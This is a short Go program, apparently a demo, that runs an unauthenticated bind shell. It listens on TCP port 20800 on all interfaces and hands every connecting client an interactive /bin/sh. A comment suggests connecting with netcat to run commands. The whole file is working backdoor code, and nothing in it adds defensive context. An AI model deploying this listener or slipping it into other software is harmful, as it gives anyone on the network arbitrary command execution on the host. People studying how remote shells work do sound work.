package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handler(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

// Run and execute nc localhost 20800
// ls
// list of files
func main() {
	l, err := net.Listen("tcp", ":20800")
	if err != nil {
		log.Fatalln(err)
	}
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handler(conn)
	}
}
